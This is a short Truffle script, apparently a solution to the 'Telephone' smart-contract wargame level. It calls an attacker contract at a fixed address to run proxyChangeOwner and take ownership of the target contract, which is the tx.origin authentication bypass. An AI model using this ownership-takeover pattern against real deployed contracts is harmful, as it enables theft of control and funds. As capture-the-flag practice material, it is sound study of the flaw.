var HackTelephone = artifacts.require("./Telephone/HackTelephone.sol");

const fromAddress = "0x55c369b3e32fAbb7bfdA6A1D86FEeFdb19bBb7aF";

//

module.exports = async function(callback) {
    let hackTelephone = HackTelephone.at("0xb939adb279ef07959f5c8eee4a7c1dfedf5e7706");
    hackTelephone.proxyChangeOwner(fromAddress, {from: fromAddress});
};
